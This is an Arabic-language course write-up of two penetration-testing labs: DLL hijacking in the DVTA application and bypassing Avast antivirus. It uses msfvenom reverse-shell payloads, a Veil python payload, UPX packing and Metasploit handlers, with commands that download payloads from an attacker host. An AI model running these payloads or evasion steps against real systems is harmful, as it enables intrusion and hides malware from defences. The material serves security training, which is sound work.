# Session 8 (eCPPTv2) - Day 8  
## Penetration Testing: Network Security 

السلام عليكم ورحمة الله وبركاته  

اليوم باذن الله راح نبدا من الي وقفنا عليه امس  

---  

معنا اليوم اول لاب  

Finding and Exploiting DLL Hijacking Vulnerabilities
-----------------------------------------------------|


بالبداية خلونا نفتح التارقت مشين  
نحصل بسطح المكتب مجلد اسمه dvta  
ندخل على المجلد ونفتح المسار dvta/bin/reales  
نشوف انه عطانا كل التفاصيل  
مثل اسم البروسس ورقمها والعملية الي تسويها ومسارها والنتيجة هل ناجحة او لا  

طبعا هنا يهمنا انه تكون الـ Result حقت البروسس name not found  
طبعا معناته انه ماحصل ملف الـ DLL بالمسار المحدد  
طبعا تقدر تفلتر بانك تضغط كليك يمين بعدين  Include CreateFile  
ف راح نسوي له DLL الان لكن خلونا نشوف وش المسار وايش البروسس وايش هو البروسس ايدي  
صح ويهمنا بعد انه في بالـ Operation يكون CreateFile  
عشان نقدر نكتب  

نرجع الان نشيك على المسار هل عندنا صلاحية الكتابه او لا  
```bash
Get-ACL 'C:\Users\Administrator\Desktop\dvta\bin\Release' | Format-List  
```  
نشوف انه قالنا انه معنا Fullcontrol  
فهذا يعني انه عندنا صلاحيات انه نكتب او نقرا او نشغل في هذا المسار  
طيب الان بنروح للبروسس حقنا ونقفله ونرجع نشغله  
بعد ماسوينا اعادة تشغيل للبروسس راح نفتحه من جديد  
طيب خلونا نسوي فلتر الان فيه كلمة Filter  فوق  
نخلي اول خيار يسار Operation  
الخيار الي بعده is  
بالفراغ نكتب CreateFile  
اخر خيار يمين نخليه Include  
نفعل الـ Process Name ثاني وحده يعني من القائمة  
الان خلونا نشغل البرنامج  
```bash
C:\Users\Administrator\Desktop\dvta\bin\Release\DVTA.exe  
```  
الان نضغط CTRL + L عشان نسوي فلتر للبروسس  
اول شي يسار نختار Process Name  
ثاني خيار نخليه is  
الفراغ نكتب فيه DVYA.exe  
واخيرا نضغط Add  
بعدين Ok  
نشوف انه عطانا كل البروسس الي شغاله واسمها DVTA.exe  
So let's clear some activity by de-selecting Show Registry Activity and Show Network Activity  
نحصلهم طبعاالقائمة الي تحت كلمة Help  
نشغل فقط الثاني والرابع  
الان خلونا نسوي فلتر للـ Result عشان مايطلع لي غير الـ Name Not Found  
نروح لبروسس الـ Result فيها قيمتها Name Not Found ونضفط  Include NAME NOT FOUND  
الان نشوف انه كل البروسس الي فيه الـ Result حقتها كلها قيمتها Name Not Found  
الان نضغط CTRL + L عشان نسوي فلتره  
اول خيار يسار نحدد انه PATH  
ثاني خيار نخليه begins with  
الفراغ نكتب فيه مسار البروسس الي هو C:\Users\Administrator\Desktop\dvta\bin\Release\DVTA.exe  
بغدين نسوي Add بعدين Ok  
نشوف انه صار العدد جدا قليل وصغرنا دائرة البحث  
لو نشوف البروسس الي قبل الاخيره الي مسارها C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll  
طبعا الان عرفنا ايش الـ DLL المفقود  

خلونا الان نستغل  
نروح للينكس وناخذ الايبي تبعنا بالامر ifconfig eth1  

الان خلونا نسوي dll ونحقن فيها الشيل تبعنا  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.2 LPORT=9001 -f dll > Dwrite.dll  
```  

حلو الان صارت معنا خلونا ننقل الـ dll الى جهاز التارقت  
اول شي نفتح بايثون سيرفر  
```bash
python3 -m http.server 80  
or  
python -m SimpleHTTPServer 80  
```  
حلو الان خلونا نفتح الليسنر عشان اول ماننقل الـ DLL ويشتغل علطول راح يجينا الشيل  
```bash
msfconsole -q  
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST 10.10.15.2  
set LPORT 4444  
exploit  
```  
الان فتحنا الليسنر  

خلونا الان ننقل الـ dll  
```bash
iwr -UseBasicParsing -Uri http://10.10.15.2/Dwrite.dll -OutFile C:\Users\Administrator\Desktop\dvta\bin\Release\Dwrite.dll  
```  
الان خلونا نفتح الـ DVTA.exe  
والان راح يستدعي الـ DLL وراح يحصل حقتنا  
والان راح يشغلها فورا اول مايفتح البرنامج  
ونرجع للـ msfconsole  
ونشوف انه اخذنا meterpreter shell  

الى هنا انتهى اللاب خلونا نشوف الي بعده  

---  

Bypassing AV
-------------|

في هذا اللاب راح نشوف طريقة من احد طرق تخطي antiviruses معروف جدا اسمه Avast  

طيب اول شي خلونا نشوف هل فيه اتصال بيننا وبين التارقت  
```bash
ping -c3 172.16.5.10  
```  
ونشوف انه فعلا فيه اتصال بيننا جميل جدا  

خلونا نفحص الان  
```bash
nmap 172.16.5.10  
```  
نشوف انه فيه بورت 3389 والي هو الـ RDP شغال  
وفي اللاب معطينا اليوزر والباسورد  

خلونا الان نتصل بالتارقت عن طريق الـ RDP  
```bash
rdesktop -u aline -p soccer 172.16.5.10  
```  
نشوف انه الان فتح لنا تمام  

طبعا نشوف الـ Antiviruses بسطح المكتب  

طيب خلونا لان نسوي لنا reverse TCP payload  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe  
file rTCP.exe  
```  
نشوف انه سوينا البايلود تمام  

خلونا الان نفتح بايثون سيرفر وننقل الملف عشان نشوف كيف الانتي فايروس يقفطه  
```bash
python3 -m http.server 80  
```  

خلونا الان نفتح ليسنر  
```bash
msfconsole -q  
use exploit/multi/handler  
set payload windows/meterpreter/reverse_tcp  
set LPORT 4444  
set LHOST 172.16.5.101  
exploit  
```  
حلو الان فتحنا الليسنر خلونا الان نروح لتارقت ونفتح الفايرفوكس ونحمل الملف عن طريق الرابط  
```bash
http://172.16.5.101/rTCP.exe  
```  
ونسوي save file  

الان نشوف انه رفض يحمل الملف قالنا Failed  
الان عرفنا ان الـ Antiviruse had detected and blocked the malicious file  

خلونا نفتح الانتي فايروس الان ونشوف وش يظهر لنا  
[detected](https://i.ibb.co/kDqwYk3/9-2.png)  

خلونا الان نقفل الانتي فايروس من السهم الي تحت يمين  
[disable_the_Avast_AV](https://i.ibb.co/kH909bm/10.png)  

الان نرجع لسطح المكتب ونفتح الـ Avast  
نشوف فوق يمين فيه Menu نضغطها  
بعدين نختار Settings  
بعدين نختار Protection  
بعدين نختار Core Shields  
ونقفل اول زر الي هو Core Shields  
راح تطلع لنا نافذه ونختار Until I turn it on again  
بعدين نضغط Ok, STOP  
نلاحظ الان ان الزر صار بالاحمر يعني قفلناه  

الان خلونا نرجع للفايرفوكس ونحاول نحمل البايلود  
نشوف انه تحمل تمام نسوي له Run  

الان نرجع للـ msfconsole  
ونشوف انه فعلا جانا meterpreter session  
خلونا ننفذ بعض الاوامر مثل  
```bash
sysinfo  
execute -f calc.exe [to launch a calculator]  
```  
الان لو نرجع لتارقت بنشوف انه فتح لنا الالة الحاسبة  

خلونا نقفل السيشن الان ونفعل الحماية حقت الانتي فايروس  
```bash
exit  
exploit  
```  
الان قفلنا السيشن وفتحنا الليسنر من جديد  

خلونا نرجع لجهاز التارقت ونفتح الـ Avast  
نشوف فوق يمين فيه Menu نضغطها  
بعدين نختار Settings  
بعدين نختار Protection  
بعدين نختار Core Shields  
ونفعل اول زر الي هو Core Shields  

خلونا الان نجرب احد التخطيات اسمه shikata_ga_nai  
خلونا نسوي البايلود باستخدام هذا التخطي  
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 > rTCPenc.exe  
```  
نشوف الان انه شفر لنا البايلود باستخدام x86/shikata_ga_nai وخليناه يشفر لنا اياه 5 مرات  

طيب الان خلونا نرجع لجهاز التارقت ونحمل البايلود الجديد  
ونشوف انه الـ Avast AV also blocked this file, So the downloading failed  

خلونا الان نستخدم اداة جديدة اسمها upx وظيفتها راح تضغط لنا الملف  
```bash
upx --best --ultra-brute -f rTCPenc.exe -o rTCPenc2.exe  
```  
نشوف الان انه تم تشفير ملف الـ exe  

خلونا نرجع لجهاز التارقت الان ونحاول نحمل الملف الجديد  
نشوف انه كذالك رفض يحمل الملف الجديد  
وهذا يعني ان الـ Avast AV detected this encoded and packed payload as well  

So the msfvenom payload wasn't successful in bypassing Avast AV's detection, and neither were the encoded or packed payloads!  


طيب الان راح نحاول نطبق شي جديد والي هو Veil Framework  
نفتح تاب جديد ونكتب الامر التالي عشان يفتح لنا الفريم وورك  
```bash
veil  
```  
نشوف انه فتح لنا وقال فيه اداتين متوفره Evasion & Ordnance  
خلونا نختار الخيار الاول وهو Evasion payload  
```bash
use 1  
```  
الان قالنا انه فيه 41 بايلود نقدر نستخدمه  
خلونا نستعرضهم عن طريق الامر التالي  
```bash
list  
```  
طيب خلونا نجرب البايلود الي رقمه 28 والي هو  
```bash
python/meterpreter/rev_tcp.py  
```  
عشان نستخدم هذا البايلود نكتب الامر هذا  
```bash
use 28  
```  
طبعا في هذا البايلود يحتاج متغيرين والي هي LPORT , LHOST  
خلونا نعطيه القيم هذي بهذي الاوامر  
```bash
set LHOST 172.16.5.101  
set LPORT 4444  
generate  
```  
الان نشوف انه حفظ لنا المخرجات في ملف اسمه rTCPveil  

خلونا الان نسوي الـ payload executable  
راح نستخدم PyInstaller  
فنعيطه رقم 1 والان نشوف انه قاعد يسوي لنا الملف التشغيلي  
ونشوف انه قالنا انه انتهى وعطانا مسار الملف  
اضغط انتر الان بعدين نكتب exit  

الان طلعنا من الفريم وورك خلونا نجيب الملف بنفس المسار الي فتحنا فيه بايثون سيرفر  
```bash
mv /var/lib/veil/output/compiled/rTCPveil.exe .  
file rTCPveil.exe  
```  
الان لو نروح نحمله نشوف انه رفض يحمل معنا  
طيب خلونا نرجع لاداة upx  
```bash
upx --best --ultra-brute -f rTCPveil.exe -o rTCPveil2.exe  
file rTCPveil2.exe  
```  
طيب حلو الان لو نحاول نحمله نشوف انه تمام تحمل معنا بدون مشاكل  
والانتي فايروس ماصاده وهذا يعني ان التوقيع او الـ Signature مو موجود في قاعدة الانتي فايروس  
ف بكذا نتلاعب بالـ Signature  

وهذا يعني انه احد الطرق الي يصيد فيها الانتي فايروس هي الـ Signature  
فهذا يعني انه الانتي فايروسس عندهم قاعدة بيانات كبيره فيها Signature معين لو حصله على طول راح يسوي بلوك للملف الي تحمله ويرفض تحميله على الجهاز  
ف انت المطلوب منك عشان تتخطى هذا الـ Signature انك تتلاعب فيه  
فيه طبعا طرق اخرى للبايباس لكن لابد بالاول تعرف وش الي قاعد يصير له detect  


خلونا الان نشغل الملف ونرجع للـ msfconsole  
نشوف  انه عطانا meterpreter session  
خلونا ننفذ الاوامر المعتاده  
```bash
sysinfo  
getuid  
```  
الان راح نستعرض البروسس حقت الـ Avast  
```bash
ps -f Avast  
```  
وهنا نشوف انه الـ Avast AV is running on the  
خلونا نجرب الان نفتح الالة الحاسبة من السيشن  
```bash
execute -f calc.exe  
```  
نرجع لجهاز التارقت ونشوف انه فعلا فتح لنا الالة الحاسبة بدون اي مشاكل  
ولو ندخل على الـ Avast بالتحديد Protection نشوف انه فعلا شغال ومعنا الشيل  


الى هنا انتهى اللاب  


الى هنا انتهينا من القسم هذا كامل الحمدالله  

وبكذا انتهت الدورة كاملة الحمدالله  
كانت ايام ممتعة اشكر الجميع من سايبرهب و المحاضر نواف الرويلي وكذالك الشباب بالدورة ماقصرو ساعدونا كثير  


نراكم على خير باذن الله  


---  

## Follow us on:  
Twitter:  
[s4cript](https://twitter.com/s4cript)  
[cyberhub](https://twitter.com/cyberhub)  
[0xNawaF1](https://twitter.com/0xNawaF1)  
